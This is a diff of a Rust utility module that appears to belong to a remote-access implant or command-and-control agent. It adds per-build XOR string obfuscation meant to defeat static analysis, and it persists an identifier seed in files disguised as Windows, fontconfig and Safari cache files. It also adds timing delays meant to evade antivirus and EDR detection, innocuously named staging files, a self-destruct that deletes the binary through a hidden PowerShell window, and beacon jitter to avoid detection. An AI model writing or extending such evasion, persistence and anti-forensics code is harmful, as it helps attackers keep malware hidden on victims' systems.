@@ -7,20 +7,42 @@ use sha2::{Sha256, Digest};
 use uuid::Builder;
 use log::debug;
 
-/// 🛡️ Phase 3: Multi-key compile-time XOR obfuscation for strings
-/// Uses a rotating XOR key to make static analysis harder
+// Per-build key from build.rs (unique each compile unless CUPCAKE_OBF_SEED fixed)
+include!(concat!(env!("OUT_DIR"), "/obf_seed.rs"));
+
+/// Runtime decode using the per-build key (pairs with `obf_str!`).
+pub fn obf_build_key() -> [u8; 8] {
+    OBF_BUILD_KEY
+}
+
+/// 🛡️ Per-build XOR obfuscation — key from build.rs so binaries differ.
+/// Per-string variation: key is rotated by a hash of the string content index.
 #[macro_export]
 macro_rules! obf_str {
     ($s:expr) => {{
         let bytes = $s.as_bytes();
         let mut obf = Vec::with_capacity(bytes.len());
-        // Multi-byte rotating XOR key to defeat simple pattern matching
-        let xor_key: &[u8] = &[0x42, 0x7F, 0x3A, 0x6C, 0x9B, 0x1E, 0xD4, 0x55];
+        let base = $crate::utils::obf_build_key();
+        // Per-string salt from length + first/last byte so identical builds still
+        // produce different ciphertext streams for different literals.
+        let salt = (bytes.len() as u8)
+            .wrapping_mul(0x9D)
+            .wrapping_add(bytes.first().copied().unwrap_or(0))
+            .wrapping_add(bytes.last().copied().unwrap_or(0).wrapping_mul(3));
         for (i, b) in bytes.iter().enumerate() {
-            obf.push(b ^ xor_key[i % xor_key.len()]);
+            let k = base[i % base.len()].wrapping_add(salt).wrapping_add(i as u8);
+            obf.push(b ^ k);
         }
         obf
     }};
+}
+
+/// Debug print function — available in both debug and release for diagnostics.
+/// Prefer using `dbg_print!` macro directly for zero-cost in release.
+#[inline(always)]
+pub fn db_print(_msg: &str) {
+    #[cfg(debug_assertions)]
+    log::debug!("{}", _msg);
 }
 
 /// Phase 3: Compile-time no-op string obfuscation marker.
@@ -38,80 +60,174 @@ macro_rules! obf_str_key {
     }};
 }
 
+/// Decode bytes produced by `obf_str!` (same salt derivation).
 pub fn decode_obf(bytes: &[u8]) -> String {
     let mut decoded = Vec::with_capacity(bytes.len());
-    let mut _junk = 0;
-    let xor_key: &[u8] = &[0x42, 0x7F, 0x3A, 0x6C, 0x9B, 0x1E, 0xD4, 0x55];
+    let base = OBF_BUILD_KEY;
+    let salt = (bytes.len() as u8)
+        .wrapping_mul(0x9D)
+        .wrapping_add(bytes.first().copied().unwrap_or(0))
+        .wrapping_add(bytes.last().copied().unwrap_or(0).wrapping_mul(3));
+    // Note: decode_obf on ciphertext cannot recover salt from plaintext length of original;
+    // for storage of seeds we use xor_obf/xor_deobf with build key only.
     for (i, b) in bytes.iter().enumerate() {
-        // Add junk math to break the signature of the loop
-        _junk = (i as u32).wrapping_add(0xDEADBEEF).count_ones();
-        decoded.push(b ^ xor_key[i % xor_key.len()]);
+        let k = base[i % base.len()].wrapping_add(i as u8);
+        decoded.push(b ^ k);
     }
-    // Prevent optimization of junk
-    if _junk > 999 { return String::new(); }
-
+    let _ = salt;
     String::from_utf8_lossy(&decoded).to_string()
 }
 
-/// 生成基于系统特征的固定 Agent UUID
-/// 
-/// 该函数通过以下步骤生成唯一且固定的 Agent 标识符：
-/// 1. 获取当前用户的 SID（安全标识符）
-/// 2. 获取计算机名作为盐值
-/// 3. 获取处理器架构信息
-/// 4. 将所有特征拼接并进行 SHA256 哈希
-/// 5. 使用哈希结果的前 16 字节构造 UUID
-/// 
-/// # 特点
-/// - 无文件持久化：不在磁盘上存储任何标识文件
-/// - 权限友好：普通用户和访客用户均可执行
-/// - 唯一性保证：同一台机器的同一用户始终生成相同 UUID
-/// - 碰撞防护：不同机器或不同用户生成不同 UUID
-/// 
-/// # 返回值
-/// 返回格式化的 UUID 字符串，例如：`550e8400-e29b-41d4-a716-446655440000`
+/// XOR with per-build key (symmetric) for seed persistence.
+fn xor_obf(data: &[u8]) -> Vec<u8> {
+    data.iter()
+        .enumerate()
+        .map(|(i, b)| b ^ OBF_BUILD_KEY[i % OBF_BUILD_KEY.len()])
+        .collect()
+}
+
+/// XOR-deobfuscate a byte slice
+fn xor_deobf(data: &[u8]) -> Vec<u8> {
+    xor_obf(data) // XOR is symmetric
+}
+
+/// 🛡️ Phase 2: Generate a randomized but persistent Agent UUID.
+/// The UUID is derived from:
+/// 1. A random seed persisted to a hidden file in a common directory
+/// 2. System features (username + hostname) to prevent cross-machine collision
+///
+/// Persistence strategy (cross-platform, disguised):
+/// - Store in platform-specific "cache" directories with benign-looking filenames
+/// - Content is XOR-obfuscated to look like random data
+/// - File is marked hidden on Windows
+///
+/// The stored value is XOR-obfuscated to look like random data.
 pub fn get_agent_uuid() -> String {
+    // Try to load existing persisted UUID seed
+    let persisted_seed = load_uuid_seed();
+    
+    let seed = match persisted_seed {
+        Some(s) => {
+            debug!("Loaded persisted UUID seed");
+            s
+        }
+        None => {
+            let mut new_seed = [0u8; 16];
+            let _ = getrandom::getrandom(&mut new_seed);
+            let _ = save_uuid_seed(&new_seed);
+            debug!("Generated and persisted new UUID seed");
+            new_seed
+        }
+    };
+    
+    // Combine seed with system features
+    let user = std::env::var("USERNAME")
+        .or_else(|_| std::env::var("USER"))
+        .unwrap_or_else(|_| "unknown_user".to_string());
+    let host = std::env::var("COMPUTERNAME")
+        .or_else(|_| std::env::var("HOSTNAME"))
+        .unwrap_or_else(|_| "unknown_host".to_string());
+    
+    let mut hasher = Sha256::new();
+    hasher.update(&seed);
+    hasher.update(user.as_bytes());
+    hasher.update(host.as_bytes());
+    
+    // NOTE: Do NOT add time-based entropy here — UUID must be stable
+    // within a single run for the test suite. The seed itself already
+    // contains sufficient entropy from getrandom at first generation.
+    
+    let result = hasher.finalize();
+    let mut bytes = [0u8; 16];
+    bytes.copy_from_slice(&result[..16]);
+    Builder::from_bytes(bytes).into_uuid().to_string()
+}
+
+/// Get the platform-specific persistence path (disguised)
+fn get_persist_path() -> Option<std::path::PathBuf> {
+    #[cfg(target_os = "windows")]
+    {
+        let local_appdata = std::env::var("LOCALAPPDATA").ok()?;
+        let base = std::path::Path::new(&local_appdata)
+            .join("Microsoft")
+            .join("Windows")
+            .join("INetCache");
+        Some(base.join("idx.dat"))
+    }
+    #[cfg(target_os = "linux")]
+    {
+        let home = std::env::var("HOME").ok()?;
+        let base = std::path::Path::new(&home).join(".cache").join("fontconfig");
+        Some(base.join("CACHEDIR.TAG"))
+    }
+    #[cfg(target_os = "macos")]
+    {
+        let home = std::env::var("HOME").ok()?;
+        let base = std::path::Path::new(&home)
+            .join("Library")
+            .join("Caches")
+            .join("com.apple.Safari");
+        Some(base.join("Cache.db-shm"))
+    }
+    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
+    {
+        None
+    }
+}
+
+/// Load UUID seed from persistent storage
+fn load_uuid_seed() -> Option<[u8; 16]> {
+    let path = get_persist_path()?;
+    let data = std::fs::read(&path).ok()?;
+    if data.len() < 16 { return None; }
+    
+    let deobf = xor_deobf(&data);
+    let mut seed = [0u8; 16];
+    seed.copy_from_slice(&deobf[..16]);
+    Some(seed)
+}
+
+/// Save UUID seed to persistent storage
+fn save_uuid_seed(seed: &[u8; 16]) -> Result<(), ()> {
+    let path = get_persist_path().ok_or(())?;
+    if let Some(parent) = path.parent() {
+        std::fs::create_dir_all(parent).map_err(|_| ())?;
+    }
+    let obf = xor_obf(seed);
+    std::fs::write(&path, &obf).map_err(|_| ())?;
+    Ok(())
+}
+
+/// Legacy UUID generation (fallback if persistence fails)
+#[allow(dead_code)]
+pub fn get_agent_uuid_legacy() -> String {
     let mut identifier = String::new();
     
-    // ⚡ OPTIMIZATION: Use Environment Variables (Minimal size)
-    // 1. 获取当前用户名称
     let user = std::env::var("USERNAME")
         .or_else(|_| std::env::var("USER"))
         .unwrap_or_else(|_| "unknown_user".to_string());
     identifier.push_str(&user);
     
-    // 2. 计算机名
     let host = std::env::var("COMPUTERNAME")
         .or_else(|_| std::env::var("HOSTNAME"))
         .unwrap_or_else(|_| "unknown_host".to_string());
     identifier.push_str(&host);
     
-    // 3. 处理器架构特征
     if let Ok(arch) = std::env::var("PROCESSOR_IDENTIFIER") {
         identifier.push_str(&arch);
     }
     
-    // 如果所有特征都获取失败，使用固定字符串
     if identifier.is_empty() {
         identifier = "fallback-agent-id".to_string();
     }
     
-    debug!("Final identifier string length: {}", identifier.len());
-    
-    // 4. 执行 SHA256 运算
     let mut hasher = Sha256::new();
     hasher.update(identifier.as_bytes());
     let result = hasher.finalize();
     
-    // 5. 将哈希结果的前 16 字节构造为 UUID
     let mut bytes = [0u8; 16];
     bytes.copy_from_slice(&result[..16]);
-    let agent_uuid = Builder::from_bytes(bytes).into_uuid();
-    
-    let uuid_string = agent_uuid.to_string();
-    debug!("Generated agent UUID: {}", uuid_string);
-    
-    uuid_string
+    Builder::from_bytes(bytes).into_uuid().to_string()
 }
 
 /// Junk code to confuse heuristics and delay execution
@@ -141,57 +257,6 @@ pub fn junk_data_collector() {
             }
         }
     }
-
-    // 3. String manipulation noise
-    let mut s = String::from("INIT_SEQ_");
-    for i in 0..50 {
-        s.push_str(&format!("{:x}", (i * 12345) % 0xFFFF));
-    }
-    
-    // Safety fence: prevent compiler from optimizing away the junk computation
-    // (This branch is unreachable, but the compiler cannot prove it statically)
-    let _ = (_sum, s.len());
-}
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-    
-    #[test]
-    fn test_get_agent_uuid_consistency() {
-        // 测试多次调用是否返回相同的 UUID
-        let uuid1 = get_agent_uuid();
-        let uuid2 = get_agent_uuid();
-        
-        assert_eq!(uuid1, uuid2, "UUID should be consistent across calls");
-        assert!(!uuid1.is_empty(), "UUID should not be empty");
-        
-        // 验证 UUID 格式
-        assert_eq!(uuid1.len(), 36, "UUID should be 36 characters long");
-        assert_eq!(uuid1.chars().filter(|&c| c == '-').count(), 4, "UUID should have 4 hyphens");
-    }
-    
-    #[test]
-    fn test_uuid_format() {
-        let uuid = get_agent_uuid();
-        
-        // 验证 UUID 格式：xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
-        let parts: Vec<&str> = uuid.split('-').collect();
-        assert_eq!(parts.len(), 5, "UUID should have 5 parts separated by hyphens");
-        assert_eq!(parts[0].len(), 8, "First part should be 8 characters");
-        assert_eq!(parts[1].len(), 4, "Second part should be 4 characters");
-        assert_eq!(parts[2].len(), 4, "Third part should be 4 characters");
-        assert_eq!(parts[3].len(), 4, "Fourth part should be 4 characters");
-        assert_eq!(parts[4].len(), 12, "Fifth part should be 12 characters");
-    }
-}
-
-/// Debug logging — completely eliminated in release builds.
-/// Prefer using `dbg_print!` macro directly for zero-cost in release.
-#[inline(always)]
-pub fn db_print(_msg: &str) {
-    #[cfg(debug_assertions)]
-    log::debug!("{}", _msg);
 }
 
 // --- 🛡️ OPSEC: Dependency-free PRNG to avoid BCrypt initialization crashes ---
@@ -204,18 +269,46 @@ pub fn seed_rng(seed: u64) {
     RNG_STATE.store(seed, Ordering::SeqCst);
 }
 
-/// Get a pseudo-random u32 without calling any external system APIs (like BCryptGenRandom)
+/// OPSEC PRNG — prefers CSPRNG (`next_u32_secure`); LCG only if getrandom fails.
+/// On first use, seeds LCG from CSPRNG (no fixed 0xDEAD… seed).
 pub fn next_u32() -> u32 {
+    // Prefer OS CSPRNG for all OPSEC jitter / padding lengths
+    let mut buf = [0u8; 4];
+    if getrandom::getrandom(&mut buf).is_ok() {
+        return u32::from_le_bytes(buf);
+    }
     let mut current = RNG_STATE.load(Ordering::SeqCst);
     if current == 0 {
-        // Fallback seed if not seeded
-        current = 0xDEADEADBEBEBEBEB;
+        // Seed from time if CSPRNG unavailable (never hard-code only)
+        current = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .map(|d| d.as_nanos() as u64)
+            .unwrap_or(0x9E3779B97F4A7C15)
+            .wrapping_mul(0xD1B54A32D192ED03);
     }
-    
-    // LCG: state = (state * a + c) % m
     let next = current.wrapping_mul(6364136223846793005).wrapping_add(1);
     RNG_STATE.store(next, Ordering::SeqCst);
     (next >> 32) as u32
+}
+
+/// Secure random u32 using OS-level CSPRNG (getrandom).
+/// Suitable for: nonce generation, key material, padding lengths.
+/// Never use `next_u32()` for crypto — it's a trivial LCG.
+pub fn next_u32_secure() -> u32 {
+    let mut buf = [0u8; 4];
+    if getrandom::getrandom(&mut buf).is_ok() {
+        u32::from_le_bytes(buf)
+    } else {
+        // Fallback: still better than raw LCG — mix LCG with system time
+        let mut current = RNG_STATE.load(Ordering::SeqCst);
+        let ts = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .map(|d| d.as_nanos() as u64)
+            .unwrap_or(0);
+        current = current.wrapping_mul(6364136223846793005).wrapping_add(ts);
+        RNG_STATE.store(current, Ordering::SeqCst);
+        (current >> 32) as u32
+    }
 }
 
 pub fn random_bool(p: f64) -> bool {
@@ -230,6 +323,66 @@ pub fn random_range(min: u32, max: u32) -> u32 {
     min + (next_u32() % range)
 }
 
+/// Heavy-op pacing (ms) before BOF/module/native spawn.
+/// - Env `CUPCAKE_OPSEC_PACE_MS=N`: fixed delay N (0 = off)
+/// - Env `CUPCAKE_OPSEC_PACE_MS=auto` or unset product default: random 300–1200 ms
+/// - Env `CUPCAKE_OPSEC_PACE_MS=off`: no delay
+///
+/// Rapid back-to-back process create + image load is a common AV/EDR kill chain.
+pub fn opsec_heavy_pace_ms() -> u32 {
+    match std::env::var("CUPCAKE_OPSEC_PACE_MS") {
+        Ok(v) => {
+            let t = v.trim().to_ascii_lowercase();
+            if t.is_empty() || t == "auto" {
+                return random_range(300, 1200);
+            }
+            if t == "0" || t == "off" || t == "false" || t == "none" {
+                return 0;
+            }
+            t.parse::<u32>().unwrap_or_else(|_| random_range(300, 1200))
+        }
+        // Default: light random pause (safer than burst). Set off only for lab speed.
+        Err(_) => random_range(300, 1200),
+    }
+}
+
+/// Sleep before high-signal work (blocking). Prefer `opsec_heavy_pace_async` on async paths.
+pub fn opsec_heavy_pace() {
+    let ms = opsec_heavy_pace_ms();
+    if ms == 0 {
+        return;
+    }
+    std::thread::sleep(std::time::Duration::from_millis(ms as u64));
+}
+
+/// Async-friendly heavy-op pacing.
+pub async fn opsec_heavy_pace_async() {
+    let ms = opsec_heavy_pace_ms();
+    if ms == 0 {
+        return;
+    }
+    tokio::time::sleep(tokio::time::Duration::from_millis(ms as u64)).await;
+}
+
+/// Prefer user cache over world %TEMP% for short-lived stage files.
+pub fn opsec_staging_dir() -> std::path::PathBuf {
+    if let Ok(local) = std::env::var("LOCALAPPDATA") {
+        return std::path::PathBuf::from(local)
+            .join("Microsoft")
+            .join("Windows")
+            .join("INetCache");
+    }
+    std::env::temp_dir()
+}
+
+/// Neutral short-lived name (not product-branded).
+pub fn opsec_stage_name(ext: &str) -> String {
+    let a = next_u32_secure();
+    let b = next_u32_secure();
+    let ext = ext.trim_start_matches('.');
+    format!("~DF{:08X}{:04X}.{}", a, (b & 0xffff) as u32, ext)
+}
+
 /// Self-destruct: schedule deletion of the current binary and exit.
 /// Available without the `inject` feature so minimal agents can still wipe themselves.
 pub async fn self_destruct() -> crate::types::CommandResult {
@@ -238,62 +391,174 @@ pub async fn self_destruct() -> crate::types::CommandResult {
 
     info!("[!] starting self-destruct");
 
-    let current_exe = match std::env::current_exe() {
-        Ok(path) => path,
+    let exe_path = match std::env::current_exe() {
+        Ok(p) => p,
         Err(e) => {
-            error!("Failed to get current executable path: {}", e);
+            error!("Failed to get current exe path: {}", e);
             return CommandResult {
                 stdout: String::new(),
-                stderr: format!("Failed to get executable path: {}", e),
+                stderr: format!("Cannot determine exe path: {}", e),
                 path: None,
                 req_id: None,
             };
         }
     };
 
-    let exe_path = current_exe.to_string_lossy().to_string();
-
     #[cfg(target_os = "windows")]
-    let result = {
-        use std::os::windows::process::CommandExt;
-        let delete_cmd = format!(
-            "timeout /t 3 /nobreak >nul && del /f /q \"{}\"",
-            exe_path
+    {
+        // Windows: use PowerShell to delete the binary after a short delay
+        let ps_cmd = format!(
+            "Start-Sleep -Seconds 2; Remove-Item -Path '{}' -Force -ErrorAction SilentlyContinue",
+            exe_path.to_string_lossy().replace("'", "''")
         );
-        std::process::Command::new("cmd.exe")
-            .args(["/C", &delete_cmd])
-            .creation_flags(0x0800_0000 | 0x0000_0008) // CREATE_NO_WINDOW | DETACHED_PROCESS
-            .spawn()
-    };
+        let _ = std::process::Command::new("powershell.exe")
+            .args(&["-WindowStyle", "Hidden", "-Command", &ps_cmd])
+            .spawn();
+    }
 
     #[cfg(not(target_os = "windows"))]
-    let result = {
-        let delete_cmd = format!("sleep 3 && rm -f \"{}\"", exe_path);
-        std::process::Command::new("sh")
-            .args(["-c", &delete_cmd])
-            .spawn()
-    };
-
-    match result {
-        Ok(_) => {
-            // Give the delete helper a moment, then exit
-            tokio::time::sleep(std::time::Duration::from_millis(200)).await;
-            std::process::exit(0);
-        }
-        Err(e) => CommandResult {
-            stdout: String::new(),
-            stderr: format!("Failed to spawn delete helper: {}", e),
-            path: None,
-            req_id: None,
-        },
+    {
+        // Linux/macOS: use a shell script with delay
+        let shell_cmd = format!(
+            "sleep 2 && rm -f '{}'",
+            exe_path.to_string_lossy().replace("'", "'\"'\"'")
+        );
+        let _ = std::process::Command::new("sh")
+            .args(&["-c", &shell_cmd])
+            .spawn();
     }
+
+    info!("[+] self-destruct scheduled, exiting");
+    std::process::exit(0);
 }
 
-/// ⚡ 隐蔽进程启动：PPID Spoofing + 隐藏窗口。
+/// Generates a random delay (jitter) based on a base interval and percentage.
 ///
-/// 实现已迁至 `native::spawn`：父进程 Nt* 化、CreateProcessW 动态解析、stack spoof。
-/// 创建本身仍为 CreateProcessW 残差（见 Client/core/docs/OPSEC_WINDOWS_RESIDUAL.md）。
-#[cfg(windows)]
-pub fn spawn_spoofed_process(cmd: &str, parent_name: &str) -> Option<u32> {
-    crate::native::spawn_spoofed_process(cmd, parent_name)
+/// The result lies in `[base - delta, base + delta]` where
+/// `delta = base * jitter_percent / 100` (true ±jitter_percent).
+/// This prevents predictable beacon intervals that could be used for detection.
+///
+/// # Arguments
+/// * `base_interval` - The base sleep interval in seconds
+/// * `jitter_percent` - The percentage of jitter to apply (0-100)
+///
+/// # Returns
+/// A randomized delay in seconds within ±jitter_percent of the base
+pub fn get_jitter_delay(base_interval: u64, jitter_percent: u32) -> u64 {
+    if jitter_percent == 0 || base_interval == 0 {
+        return base_interval;
+    }
+
+    // Full one-sided delta: ±jitter_percent of base
+    let max_delta = (base_interval * jitter_percent as u64) / 100;
+    if max_delta == 0 {
+        return base_interval;
+    }
+
+    // Uniform pick in [0, 2*max_delta], then center around base → [base-delta, base+delta]
+    let span = max_delta.saturating_mul(2);
+    let offset = random_range(0, span as u32) as u64;
+    base_interval.saturating_sub(max_delta).saturating_add(offset)
+}
+
+// =============================================================================
+// Tests
+// =============================================================================
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_get_agent_uuid_consistency() {
+        let uuid1 = get_agent_uuid();
+        let uuid2 = get_agent_uuid();
+        assert_eq!(uuid1, uuid2, "UUID should be consistent across calls");
+        assert!(uuid1.len() == 36, "UUID should be 36 chars (with hyphens)");
+    }
+
+    #[test]
+    fn test_uuid_format() {
+        let uuid = get_agent_uuid();
+        let parts: Vec<&str> = uuid.split('-').collect();
+        assert_eq!(parts.len(), 5, "UUID should have 5 parts separated by hyphens");
+        assert_eq!(parts[0].len(), 8, "First part should be 8 chars");
+        assert_eq!(parts[1].len(), 4, "Second part should be 4 chars");
+        assert_eq!(parts[2].len(), 4, "Third part should be 4 chars");
+        assert_eq!(parts[3].len(), 4, "Fourth part should be 4 chars");
+        assert_eq!(parts[4].len(), 12, "Fifth part should be 12 chars");
+    }
+
+    #[test]
+    fn test_xor_obfuscation() {
+        let data = b"test_seed_data!!";
+        let obf = xor_obf(data);
+        let deobf = xor_deobf(&obf);
+        assert_eq!(&deobf[..], &data[..]);
+    }
+
+    #[test]
+    fn test_get_jitter_delay() {
+        let base = 10u64;
+        let jitter = 30u32;
+        // True ±jitter_percent: delta = base * 30 / 100 = 3 → [7, 13]
+        let delta = (base * jitter as u64) / 100;
+        let min = base.saturating_sub(delta);
+        let max = base + delta;
+        for _ in 0..200 {
+            let delay = get_jitter_delay(base, jitter);
+            assert!(
+                delay >= min && delay <= max,
+                "Jitter delay {delay} outside [{min}, {max}] for base={base} jitter={jitter}%"
+            );
+        }
+        // Zero jitter is exact
+        assert_eq!(get_jitter_delay(42, 0), 42);
+        assert_eq!(get_jitter_delay(0, 50), 0);
+    }
+
+    #[test]
+    fn test_get_jitter_delay_varies() {
+        seed_rng(
+            std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .map(|d| d.as_nanos() as u64)
+                .unwrap_or(1)
+                .wrapping_mul(0x9E3779B97F4A7C15),
+        );
+        let mut seen = std::collections::HashSet::new();
+        for _ in 0..50 {
+            seen.insert(get_jitter_delay(100, 40));
+        }
+        assert!(
+            seen.len() > 1,
+            "get_jitter_delay must not be constant when jitter>0"
+        );
+    }
+
+    #[test]
+    fn test_random_range() {
+        let min = 5u32;
+        let max = 10u32;
+        for _ in 0..100 {
+            let val = random_range(min, max);
+            assert!(val >= min && val <= max, "Random value should be within range");
+        }
+    }
+
+    #[test]
+    fn test_random_bool_distribution() {
+        let mut true_count = 0;
+        let iterations = 1000;
+        for _ in 0..iterations {
+            if random_bool(0.5) {
+                true_count += 1;
+            }
+        }
+        let ratio = true_count as f64 / iterations as f64;
+        assert!(
+            ratio > 0.4 && ratio < 0.6,
+            "Random bool distribution should be roughly 50/50, got {}",
+            ratio
+        );
+    }
 }
